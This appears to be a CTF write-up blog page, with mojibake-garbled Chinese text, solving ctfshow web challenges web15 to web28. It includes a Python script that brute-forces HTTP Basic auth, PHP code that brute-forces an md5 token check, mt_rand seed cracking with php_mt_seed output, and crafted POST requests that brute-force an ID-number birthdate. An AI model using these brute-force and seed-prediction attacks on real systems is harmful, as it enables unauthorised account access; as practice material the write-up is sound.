title="web15"></a>web15</h3><p>åœ¨æœ€åº•éƒ¨å‘ç°<code>1156631961@qq.com</code>ï¼Œæœç´¢<code>QQ</code>åå‘ç°å±…ä½åœ¨<code>è¥¿å®‰</code></p><p>è®¿é—®<code>\admin</code>ï¼Œç‚¹å‡»é‡ç½®å¯†ç è¾“å…¥å¯¹åº”åŸå¸‚å³å¯é‡ç½®å¯†ç </p><p>ä½¿ç”¨<code>admin/admin7789</code>ç™»å½•å³å¯</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>è®¿é—®<code>/tz.php</code>ï¼Œåœ¨<code>PHPç›¸å…³å‚æ•°</code>ä¸­å‘ç°<code>PHPINFO</code>ï¼Œç‚¹å‡»åè·³è½¬è‡³<code>/tz.php?act=phpinfo</code>ï¼Œæœç´¢<code>ctfshow</code>å³å¯</p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>åœ¨æºç ä¸­å‘ç°<code>var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;);</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&#x27;</span>)</span><br><span class="line"><span class="comment">//ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹</span></span><br></pre></td></tr></table></figure><p>è®¿é—®<code>/110.php</code></p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>æŸ¥çœ‹æºç å‘ç°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    &lt;!--</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure><p>æ•…ç›´æ¥<code>POST</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&amp;username=admin</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>æŸ¥çœ‹æºç å‘ç°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkForm</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="string">&quot;0000000372619038&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> iv = <span class="string">&quot;ilove36dverymuch&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> pazzword = $(<span class="string">&quot;#pazzword&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">        pazzword = <span class="title function_">encrypt</span>(pazzword,key,iv);</span><br><span class="line">        $(<span class="string">&quot;#pazzword&quot;</span>).<span class="title function_">val</span>(pazzword);</span><br><span class="line">        $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">submit</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">data,key,iv</span>) &#123; <span class="comment">//key,ivï¼š16ä½çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">var</span> key1  = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Latin1</span>.<span class="title function_">parse</span>(key);</span><br><span class="line">        <span class="keyword">var</span> iv1   = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Latin1</span>.<span class="title function_">parse</span>(iv);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(data, key1,&#123;</span><br><span class="line">            iv : iv1,</span><br><span class="line">            mode : <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">            padding : <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">ZeroPadding</span></span><br><span class="line">        &#125;).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ•…ä½¿ç”¨<code>AES</code>è§£å¯†ï¼Œç„¶åç”¨<code>admin/i_want_a_36d_girl</code>ç™»å½•</p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>è®¿é—®<code>/db/db.mdb</code>ï¼Œä½¿ç”¨<code>DbView-v1.1</code>æŸ¥çœ‹ï¼Œåœ¨<code>Switchboard Items</code>ä¸­<code>ItemNumber=5</code>çš„è¡¨é¡¹ä¸­çš„<code>ItemText</code>ä¸­æ‰¾åˆ°<code>flag</code></p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>ä½¿ç”¨<code>dirsearch</code>å‘ç°<code>/backup.sql</code></p><h2 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>æŠ“åŒ…å‘ç°å¤´éƒ¨å­—æ®µ<code>Authorization: Basic YWRtaW46YWRtaW4=</code>ï¼Œä½¿ç”¨é¢˜ç›®æ‰€ç»™å­—å…¸çˆ†ç ´</p><h4 id="æ–¹æ³•ä¸€-1"><a href="#æ–¹æ³•ä¸€-1" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>ç¼–å†™<code>exp</code>å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> passwd <span class="keyword">in</span> f.readlines():</span><br><span class="line">d.append(passwd.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">url = <span class="string">&#x27;http://accbdbeb-c52b-44ae-a03e-df483ff243e7.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">payload = base64.b64encode((<span class="string">&#x27;admin:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(d[i])).encode())</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)),</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(headers)</span></span><br><span class="line">response = requests.post(url=url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="comment"># print(headers[&#x27;Authorization&#x27;])</span></span><br><span class="line"><span class="comment"># flag = re.findall(&#x27;ctfshow&#123;(.*?)&#125;&#x27;,response.text)[0]</span></span><br><span class="line"><span class="comment"># print(&#x27;ctfshow&#123;&#x27; + flag + &#x27;&#125;&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒ-1"><a href="#æ–¹æ³•äºŒ-1" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>ä½¿ç”¨<code>burp</code>çš„çˆ†ç ´æ¨¡å—</p><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>è®¿é—®<a href="https://vip.ctf.show/%E5%90%8E%E9%BC%A0%E6%A0%87%E7%A7%BB%E5%8A%A8%E5%88%B0%E6%A0%87%E7%AD%BE%E5%A4%84%E5%81%9C%E9%A1%BF%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97%60flag%60">https://vip.ctf.show/åé¼ æ ‡ç§»åŠ¨åˆ°æ ‡ç­¾å¤„åœé¡¿å³å¯è·å¾—`flag`</a></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p>æ‰“å¼€å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="comment">// echo $flag;</span></span><br><span class="line">            <span class="comment">// echo &#x27;flag&#123;123&#125;&#x27;;</span></span><br><span class="line">         <span class="keyword">echo</span> <span class="variable">$t</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$i</span>)) <span class="keyword">break</span>;<span class="comment">//422</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/?token=422</code></p><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›¸åŒçš„éšæœºæ•°ç§å­ï¼Œç”Ÿæˆéšæœºæ•°å¯¹åº”ä¸€è‡´ï¼ˆæ³¨æ„ç‰ˆæœ¬ä¸€è‡´ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php7</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>(); <span class="comment">//ç¬¬ä¸€æ¬¡æ˜¯1155388967</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/?r=1155388967</code></p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥<code>r=0</code>å¯å¾—<code>-1010439643</code>ï¼Œä½¿ç”¨<code>php_mt_seed</code>è¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pattern: EXACT</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xf8000000 - 0xfbffffff, speed 6820.9 Mseeds/s </span><br><span class="line">seed = 0xfa4317f0 = 4198701040 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">seed = 0xfa4317f1 = 4198701041 (PHP 3.0.7 to 5.2.0)</span><br><span class="line">Found 2, trying 0xfc000000 - 0xffffffff, speed 6819.1 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 2, trying 0x42000000 - 0x43ffffff, speed 57.2 Mseeds/s </span><br><span class="line">seed = 0x430ee585 = 1125049733 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">seed = 0x430ee585 = 1125049733 (PHP 7.1.0+)</span><br><span class="line">Found 4, trying 0x52000000 - 0x53ffffff, speed 56.8 Mseeds/s </span><br><span class="line">seed = 0x5391f6d3 = 1402074835 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">seed = 0x5391f6d3 = 1402074835 (PHP 7.1.0+)</span><br><span class="line">Found 6, trying 0x6e000000 - 0x6fffffff, speed 57.0 Mseeds/s </span><br><span class="line">seed = 0x6e47e308 = 1850204936 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">seed = 0x6e47e308 = 1850204936 (PHP 7.1.0+)</span><br><span class="line">Found 8, trying 0xa6000000 - 0xa7ffffff, speed 57.0 Mseeds/s </span><br><span class="line">seed = 0xa7809666 = 2810222182 (PHP 7.1.0+)</span><br><span class="line">Found 9, trying 0xfe000000 - 0xffffffff, speed 57.1 Mseeds/s </span><br><span class="line">Found 9</span><br></pre></td></tr></table></figure><p>å¯¹è·å¾—çš„ç»“æœå°è¯•åå‘ç°<code>Seed</code>ä¸º<code>2810222182</code>ï¼Œæ•…æœ€ç»ˆ<code>payload</code>ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?r=1010439643</span><br><span class="line">Cookie:</span><br><span class="line">token=750365370</span><br></pre></td></tr></table></figure><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/checkdb.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b5d52ac9-2c1b-4dc5-8cba-ee3657699628.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://b5d52ac9-2c1b-4dc5-8cba-ee3657699628.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://b5d52ac9-2c1b-4dc5-8cba-ee3657699628.challenge.ctf.show/install.php?</span><br><span class="line"></span><br><span class="line"><span class="language-dts">a=<span class="variable">&amp;p</span>=<span class="variable">&amp;d</span>=<span class="variable">&amp;u</span>=<span class="variable">&amp;pass</span>=</span></span><br></pre></td></tr></table></figure><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>ä¸‹è½½åå•</p><table><thead><tr><th>CTFshowèœé¸¡å­¦é™¢å½•å–åå•</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>åºå·</td><td>å§“å</td><td>ä¸“ä¸š</td><td>èº«ä»½è¯å·ç </td><td>å¤‡æ³¨</td></tr><tr><td>1</td><td>é«˜å…ˆä¼Š</td><td>WEB</td><td>621022********5237</td><td></td></tr><tr><td>2</td><td>åµ‡å¼€æ¢¦</td><td>MISC</td><td>360730********7653</td><td>å…šå‘˜</td></tr><tr><td>3</td><td>éƒåº·ç„•</td><td>RE</td><td>522601********8092</td><td></td></tr><tr><td>4</td><td>å…ƒç¾¿è°†</td><td>PWN</td><td>451023********3419</td><td>ç”Ÿæºåœ°è´·æ¬¾</td></tr><tr><td>5</td><td>ç¥è½å…´</td><td>CRYPTO</td><td>410927********5570</td><td></td></tr></tbody></table><p>è§‚å¯Ÿåå‘ç°ç¼ºå¤±å‡ºç”Ÿå¹´æœˆéƒ¨åˆ†ï¼Œçˆ†ç ´åæ˜“çŸ¥å‡ºç”Ÿå¹´æœˆä¸º<code>19900201</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/info/checkdb.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e12947b8-123f-473f-a946-e55108e2c1d1.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">a=<span class="meta">%</span>E<span class="number">9</span><span class="meta">%</span>AB<span class="meta">%</span><span class="number">98</span><span class="meta">%</span>E<span class="number">5</span><span class="meta">%</span><span class="number">85</span><span class="meta">%</span><span class="number">88</span><span class="meta">%</span>E<span class="number">4</span><span class="meta">%</span>BC<span class="meta">%</span><span class="number">8</span>A&amp;p=<span class="number">621022199002015237</span></span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼Œè§£ç å<code>æ­å–œæ‚¨ï¼Œæ‚¨å·²è¢«æˆ‘æ ¡å½•å–ï¼Œä½ çš„å­¦å·ä¸º02015237 åˆå§‹å¯†ç ä¸ºèº«ä»½è¯å·ç </code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;0&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç™»å½•å³å¯</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>çˆ†ç 